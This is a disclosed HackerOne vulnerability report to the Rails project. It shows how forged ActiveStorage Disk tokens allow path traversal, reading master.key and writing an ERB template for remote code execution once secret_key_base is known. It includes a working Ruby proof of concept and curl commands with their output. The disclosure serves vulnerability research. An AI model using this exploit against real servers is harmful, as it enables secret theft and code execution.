# Path traversal in AcitveStorage, and lead RCE

## Report Details
- **Report ID**: 2334455
- **URL**: https://hackerone.com/reports/2334455
- **State**: Closed
- **Severity**: high
- **Submitted**: 2024-01-25T14:17:59.094Z
- **Disclosed**: 2024-10-08T20:26:06.327Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
The danger of deserialization has been reduced in Rails 7.1 by increasing the number of settings that do not use Marshal in MessageVerifier.

However, another danger remains with AcitveStorage(`service: Disk`), which allows path traversal using the `key` value. However, the attacker must know the value of `secret_key_base`.

### PoC

```
❯ ruby -v
ruby 3.2.3 (2024-01-18 revision 52bb2ac0a6) [arm64-darwin22]

❯ rails new disk_traversal_7_1 -G -M -C -A -J -T 
=>  Rails 7.1.3

❯ bin/rails active_storage:install

❯ RAILS_ENV=production bin/rails db:migrate
```

edit `config/production.rb`

```
# config.force_ssl = true
...

config.active_support.message_serializer = :json
```

start server

```
❯ RAILS_ENV=production bundle exec rails s
```

`traversal.rb`

```ruby
content_disposition = "inline"
content_type = "text/plain"
name = "disk"

secret_key_base = Rails.application.secret_key_base

key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
secret = key_generator.generate_key("ActiveStorage")

serializer =  ActiveStorage.verifier.instance_variable_get(:@serializer)
puts serializer
puts "--"


key ="././../config/master.key"
verifier = ActiveSupport::MessageVerifier.new(secret, serializer: serializer)
read_token = verifier.generate(
          {
            key: key,
            disposition: content_disposition,
            content_type: content_type,
            service_name: name
          },
          purpose: :blob_key
        )

puts "read token:"
puts "#{read_token}"
puts "read curl: "
puts  "curl \"http://0.0.0.0:3000/rails/active_storage/disk/#{read_token}/test\""
puts "--"

target_file ="../app/views/users/show.text.erb"
content = "<% system('date') %>"
verifier = ActiveSupport::MessageVerifier.new(secret, serializer: serializer)
token_write = verifier.generate(
          {
            key: target_file,
            disposition: content_disposition,
            content_type: content_type,
            content_length: content.bytesize,
            service_name: name
          },
          purpose: :blob_token
        )

puts "write target_file:"
puts "#{target_file}"
puts "write token:"
puts "#{token_write}"
puts "write curl:"
puts "curl -X PUT -H \"Content-type: #{content_type}\" -d \"#{content}\" http://0.0.0.0:3000/rails/active_storage/disk/#{token_write}"
```

```
❯ RAILS_ENV=production bundle exec rails runner traversal.rb
W, [2024-01-25T22:57:10.036960 #16497]  WARN -- : You are running SQLite in production, this is generally not recommended. You can disable this warning by setting "config.active_record.sqlite3_production_warning=false".
ActiveSupport::Messages::SerializerWithFallback::JsonWithFallback
--
read token:
eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7
read curl:
curl "http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7/test"
--
write target_file:
../app/views/users/show.text.erb
write token:
eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e
write curl:
curl -X PUT -H "Content-type: text/plain" -d "<% system('date') %>" http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e
```

Access to read curl will get the file at any path, and access to write curl will write to any path and confirm the RCE.

## Impact

If `secret_key_base` is leaked, there is a risk of reading and writing files on the server and thereby an RCE.

## Attachments
No attachments
